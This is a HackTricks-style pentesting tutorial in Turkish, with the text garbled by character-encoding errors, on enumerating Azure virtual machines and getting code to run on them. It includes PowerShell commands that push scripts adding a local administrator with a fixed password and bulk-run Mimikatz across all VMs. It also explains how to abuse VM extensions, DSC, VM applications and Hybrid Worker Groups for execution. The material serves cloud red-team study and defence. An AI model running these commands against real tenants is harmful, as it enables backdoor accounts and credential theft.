# Az - Sanal Makineler ve AÄŸ

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks EÄŸitim AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve uygulayÄ±n: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks EÄŸitim GCP KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ± (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ± paylaÅŸarak PR'ler gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>
{% endhint %}

## Temel bilgiler

[Belgelerden alÄ±ntÄ±:](https://learn.microsoft.com/en-us/azure/virtual-machines/overview) Azure sanal makineler, Azure'Ä±n sunduÄŸu birkaÃ§ tÃ¼rden biridir [ihtiyaca gÃ¶re Ã¶lÃ§eklenebilir hesaplama kaynaklarÄ±](https://learn.microsoft.com/en-us/azure/architecture/guide/technology-choices/compute-decision-tree). Genellikle, diÄŸer seÃ§eneklerin sunmadÄ±ÄŸÄ± hesaplama ortamÄ± Ã¼zerinde daha fazla kontrol gerektiÄŸinde sanal makine seÃ§ersiniz. Bu makale, bir sanal makine oluÅŸturmadan Ã¶nce dikkate almanÄ±z gereken bilgileri, nasÄ±l oluÅŸturulacaÄŸÄ±nÄ± ve nasÄ±l yÃ¶netileceÄŸini size verir.

## Azure AÄŸ Bilgileri

Azure aÄŸlarÄ± **farklÄ± varlÄ±klar ve yapÄ±landÄ±rma yÃ¶ntemleri iÃ§erir.** FarklÄ± Azure aÄŸ varlÄ±klarÄ±nÄ±n kÄ±sa **aÃ§Ä±klamalarÄ±nÄ±,** **Ã¶rneklerini** ve **numaralandÄ±rma** komutlarÄ±nÄ± aÅŸaÄŸÄ±daki baÄŸlantÄ±da bulabilirsiniz:

{% content-ref url="az-azure-network.md" %}
[az-azure-network.md](az-azure-network.md)
{% endcontent-ref %}

## Azure Bastion

**Azure Bastion**, Azure portalÄ± Ã¼zerinden SSL aracÄ±lÄ±ÄŸÄ±yla gÃ¼venli, tamamen yÃ¶netilen bir RDP (Uzak MasaÃ¼stÃ¼ ProtokolÃ¼) ve SSH (GÃ¼venli Kabuk) eriÅŸim Ã§Ã¶zÃ¼mÃ¼ sunar. Azure Sanal AÄŸÄ± iÃ§inde entegre edilmiÅŸtir ve RDP ve SSH baÄŸlantÄ±larÄ±nÄ± Ã¶zel IP'ler kullanarak VM'lere saÄŸlar, halka aÃ§Ä±k IP'lerin gereksiz hale gelmesini saÄŸlar. Bu, geliÅŸtiricilerin ve IT personelinin tarayÄ±cÄ±larÄ±nÄ± kullanarak Azure portalÄ±ndan VM'lere gÃ¼venli bir ÅŸekilde eriÅŸmelerini saÄŸlar, geliÅŸtirme ve test ortamlarÄ± iÃ§in sÃ¼reci basitleÅŸtirir.

AboneliÄŸinizdeki tÃ¼m Azure Bastion Ana BilgisayarlarÄ±nÄ± listelemek iÃ§in aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:

{% code overflow="wrap" %}
```bash
az network bastion list --query "[].{name:name, resourceGroup:resourceGrou, location:location}" -o table
```
{% endcode %}

## VM NumaralandÄ±rma
```powershell
# Get readable VMs
Get-AzVM | fl
# Lis running VMs
Get-AzureRmVM -status | where {$_.PowerState -EQ "VM running"} | select ResourceGroupName,Name
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | fl *
Get-AzVM -Name <name> -ResourceGroupName <res_group_name> | select -ExpandProperty NetworkProfile

# Get iface and IP address
Get-AzNetworkInterface -Name <interface_name>
Get-AzPublicIpAddress -Name <iface_public_ip_id>

#Get installed extensions
Get-AzVMExtension -ResourceGroupName <res_group_name> -VMName <name>

Get-AzVM | select -ExpandProperty NetworkProfile # Get name of network connector of VM
Get-AzNetworkInterface -Name <name> # Get info of network connector (like IP)
```
## **Bir VM'de komut Ã§alÄ±ÅŸtÄ±rÄ±n**

### **VM'de AAD GiriÅŸi**

AzureAD Ã¼zerinden kimlik doÄŸrulamasÄ± yapÄ±lmÄ±ÅŸ kullanÄ±cÄ±lara eriÅŸime izin vermek mÃ¼mkÃ¼ndÃ¼r. Ã–rneÄŸin bir **linux VM**'ye eriÅŸmeye Ã§alÄ±ÅŸÄ±rken: `ssh kullanÄ±cÄ±adÄ±@azure-corp.com@1.1.1.1` (giriÅŸ yapmaya Ã§alÄ±ÅŸÄ±rken kullanÄ±lan azurecorp ile **e-postayÄ± kullanmak Ã¶nemlidir**) gibi bir hata alabilirsiniz:
```
(username@azure-corp.com@1.1.1.1) This preview capability is not for production use. When you sign in, verify the name of the app on the sign-in screen is "Azure Linux VM Sign-in" and the IP address of the target VM is correct.

To sign in, use a web browser to open the page https://microsoft.com/devicelogin and enter the code DT4PNSTGR to authenticate. Press ENTER when ready.
```
{% endcode %}

Sadece **bu talimatlarÄ± takip edin** [https://microsoft.com/devicelogin](https://microsoft.com/devicelogin) adresine gidin ve kodu belirtin, kimlik bilgileri olarak e-posta ve ÅŸifreyi kullanÄ±n ve SSH Ã¼zerinden baÄŸlantÄ± kurabileceksiniz (eÄŸer bu kullanÄ±cÄ± yeterli izne sahipse: `Sanal Makine YÃ¶netici GiriÅŸi` veya `Sanal Makine KullanÄ±cÄ± GiriÅŸi` rolÃ¼).

### **Komut Ã‡alÄ±ÅŸtÄ±r**
```powershell
# The permission allowing this is Microsoft.Compute/virtualMachines/runCommand/action
Invoke-AzVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose
## Another way
Invoke-AzureRmVMRunCommand -ScriptPath .\adduser.ps1 -CommandId 'RunPowerShellScript' -VMName 'juastavm' -ResourceGroupName 'Research' â€“Verbose

# Content of the script
$passwd = ConvertTo-SecureString "Welcome2022!" -AsPlainText -Force
New-LocalUser -Name new_user -Password $passwd
Add-LocalGroupMember -Group Administrators -Member new_user
```

```powershell
# Try to run in every machine
Import-module MicroBurst.psm1
Invoke-AzureRmVMBulkCMD -Script Mimikatz.ps1 -Verbose -output Output.txt
```
### **Ã–zel Komut UzantÄ±sÄ±nÄ± Ã‡alÄ±ÅŸtÄ±rÄ±n**

Azure sanal makine (VM) uzantÄ±larÄ±, **Azure VM'lerinde** sonrasÄ±nda yapÄ±landÄ±rma ve otomasyon **gÃ¶revleri** saÄŸlayan **kÃ¼Ã§Ã¼k uygulamalar**dÄ±r. Ã–rneÄŸin, bir sanal makine yazÄ±lÄ±m kurulumu, antivirÃ¼s korumasÄ± veya iÃ§inde bir komut dosyasÄ± Ã§alÄ±ÅŸtÄ±rma yeteneÄŸi gerektiriyorsa, bir VM uzantÄ±sÄ± kullanabilirsiniz.

Bu nedenle, yazma eriÅŸiminiz varsa keyfi kodu yÃ¼rÃ¼tebilirsiniz:
```powershell
# Microsoft.Compute/virtualMachines/extensions/write
Set-AzVMExtension -ResourceGroupName "Research" -ExtensionName "ExecCmd" -VMName "infradminsrv" -Location "Germany West Central" -Publisher Microsoft.Compute -ExtensionType CustomScriptExtension -TypeHandlerVersion 1.8 -SettingString '{"commandToExecute":"powershell net users new_user Welcome2022. /add /Y; net localgroup administrators new_user /add"}'
```
### DesiredConfigurationState (DSC)

DesiredConfigurationState (DSC), Ansible'a benzer ÅŸekilde kullanÄ±lan bir PowerShell aracÄ±dÄ±r ve bir ana bilgisayarÄ± kod aracÄ±lÄ±ÄŸÄ±yla yapÄ±landÄ±rmak iÃ§in kullanÄ±lÄ±r. DSC, belirli yapÄ±landÄ±rma dosyalarÄ±nÄ±n yÃ¼klenmesine izin veren Azure ile entegre olur. Bu dosyalar katÄ± bir sÃ¶zdizimine uymalÄ±dÄ±r. Ã–zellikle, Azure'daki DSC uzantÄ±sÄ±, belirli biÃ§imlendirme kriterlerini karÅŸÄ±layan dosyalardan komutlarÄ± yÃ¼rÃ¼tebilir, hatta sÃ¶zdizimi DSC standartlarÄ±na uygun deÄŸilse bile, saÄŸlanan ÅŸekilde gÃ¶sterildiÄŸi gibi.

Bu komutlarÄ±n yÃ¼rÃ¼tÃ¼lmesi, Az PowerShell'deki [**`Publish-AzVMDscConfiguration`**](https://docs.microsoft.com/en-us/powershell/module/az.compute/publish-azvmdscconfiguration?view=azps-7.5.0) iÅŸlevi tarafÄ±ndan kolaylaÅŸtÄ±rÄ±lÄ±r. Gereksinimler arasÄ±nda tanÄ±mlÄ± bir iÅŸlev iÃ§eren bir **.PS1** dosyasÄ± ve dosyanÄ±n bir **.zip** dosyasÄ±na sÄ±kÄ±ÅŸtÄ±rÄ±lmasÄ± bulunur. DSC iÃ§in sÃ¶zdizimi doÄŸru olmasa bile, kod hala yÃ¼rÃ¼tÃ¼lecektir. Ancak, uzantÄ± yÃ¼rÃ¼tme durumunu "baÅŸarÄ±sÄ±zlÄ±k" olarak iÅŸaretleyecek ve komuttan gelen Ã§Ä±ktÄ± gÃ¶rÃ¼nmeyecektir Ã§Ã¼nkÃ¼ durum baÅŸarÄ±sÄ±zlÄ±k mesajÄ± tarafÄ±ndan Ã¼zerine yazÄ±lacaktÄ±r.

### VM Uygulama TanÄ±mlarÄ±

VM Uygulama TanÄ±mlarÄ±, sÃ¼rÃ¼mlÃ¼ uygulamalarÄ±n Azure VM'ye tekrarlanabilir bir ÅŸekilde daÄŸÄ±tÄ±lmasÄ±na olanak tanÄ±r. Bu kaynak, uygulamalarÄ±n VM'ler arasÄ±nda daÄŸÄ±tÄ±lmasÄ±nÄ± ve gÃ¼ncellenmesini destekler. Bunun kurulmasÄ± iÃ§in **`New-AzGalleryApplication`** ve **`New-AzGalleryApplicationVersion`** gibi komutlarÄ± iÃ§eren adÄ±mlar gereklidir Az PowerShell'de.

Bu yÃ¶ntemle uygulamalarÄ±n veya komutlarÄ±n yÃ¼rÃ¼tÃ¼lmesi, uygulama bir VM'ye uygulandÄ±ÄŸÄ±nda otomatik olarak yÃ¼klenen **"VMAppExtension"** ile gerÃ§ekleÅŸtirilir. UzantÄ±, belirtilen URI'den dosyayÄ± alÄ±r ve uygulama adÄ±yla, uzantÄ±sÄ±z olarak adlandÄ±rÄ±r. DosyayÄ± doÄŸru ÅŸekilde yÃ¼rÃ¼tmek iÃ§in REST API Ã§aÄŸrÄ±sÄ±ndaki "ManageActions" alanÄ±nÄ±n dosyayÄ± uygun uzantÄ±yla yeniden adlandÄ±rmak iÃ§in yapÄ±landÄ±rÄ±lmasÄ± gerekir. Bu yÃ¶ntemin kurulumu tamamlandÄ±ÄŸÄ±nda, saÄŸlanan ÅŸekilde gÃ¶sterildiÄŸi gibi bir yapÄ±ya benzeyecektir.

Ancak, bu yÃ¼rÃ¼tme yÃ¶ntemi oldukÃ§a yavaÅŸ olup, bir uygulamanÄ±n veya komutun yÃ¼rÃ¼tÃ¼lmesi yaklaÅŸÄ±k 3-4 dakika sÃ¼rer. Bu sÃ¼rece iliÅŸkin dosyalar, uygulama kopyasÄ± iÃ§in (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Downloads\`) ve yÃ¼rÃ¼tme durumu iÃ§in (`C:\Packages\Plugins\Microsoft.CPlat.Core.VMApplicationManagerWindows\1.0.4\Status\`) belirli dizinlerde saklanÄ±r.

Her iki teknik de Azure ortamlarÄ±nda komutlarÄ±n yÃ¼rÃ¼tÃ¼lmesi ve uygulamalarÄ±n daÄŸÄ±tÄ±lmasÄ± iÃ§in benzersiz yÃ¶ntemler sunar, her birinin kendi gereksinimleri, adÄ±mlarÄ± ve dikkate alÄ±nmasÄ± gerekenleri vardÄ±r.

### Azure'daki Hybrid Worker Groups (HWG'ler)

[**Hybrid Worker Groups (HWG'ler)**](https://docs.microsoft.com/en-us/azure/automation/automation-hybrid-runbook-worker), bir Automation Account'ta yapÄ±landÄ±rÄ±lmÄ±ÅŸ Runbook'larÄ±n, belirlenmiÅŸ HWG'nin bir parÃ§asÄ± olan bir Azure Sanal Makinesi (VM) Ã¼zerinde yÃ¼rÃ¼tÃ¼lmesine olanak tanÄ±yan bir Ã¶zelliktir. Bu yÃ¼rÃ¼tme, VM Ã¼zerine yÃ¼klenen bir uzantÄ± aracÄ±lÄ±ÄŸÄ±yla gerÃ§ekleÅŸtirilir ve Runbook kodunu VM'ye daÄŸÄ±tÄ±r. Bu sÃ¼recin Ã¶nemli bir yÃ¶nÃ¼, gerÃ§ek kimlik bilgilerinin yÃ¼rÃ¼tmede bir faktÃ¶r olmamasÄ±dÄ±r Ã§Ã¼nkÃ¼ kod, Ã¶zellikle **SYSTEM** veya root olarak yÃ¼kseltilmiÅŸ ayrÄ±calÄ±klarla Ã§alÄ±ÅŸÄ±r, saÄŸlanan ÅŸekilde gÃ¶sterildiÄŸi gibi.

Windows 10 VM'lerini kullananlar iÃ§in Ã¶nemli bir detay, Runbook iÃ§in PowerShell sÃ¼rÃ¼mÃ¼nÃ¼ belirtme gerekliliÄŸidir. Runbook'un PowerShell SÃ¼rÃ¼mÃ¼nÃ¼n 7.1 yerine 5.1 olarak ayarlanmasÄ± gerekmektedir. Bu gereklilik, PowerShell 7.1'in bu VM'lerde varsayÄ±lan olarak yÃ¼klÃ¼ olmamasÄ±ndan kaynaklanmaktadÄ±r ve 7.1 sÃ¼rÃ¼mÃ¼ belirtilirse betik yÃ¼rÃ¼tmesinde bir baÅŸarÄ±sÄ±zlÄ±ÄŸa neden olabilir.

Azure'Ä±n bu Ã¶zelliÄŸi, hibrit ortamlarda gÃ¶revleri otomatikleÅŸtirmek ve yÃ¶netmek iÃ§in gÃ¼Ã§lÃ¼ bir yÃ¶ntem sunar, Azure VM'lerinde gÃ¶revlerin merkezi yÃ¶netimi ve yÃ¼rÃ¼tÃ¼lmesine olanak tanÄ±r.
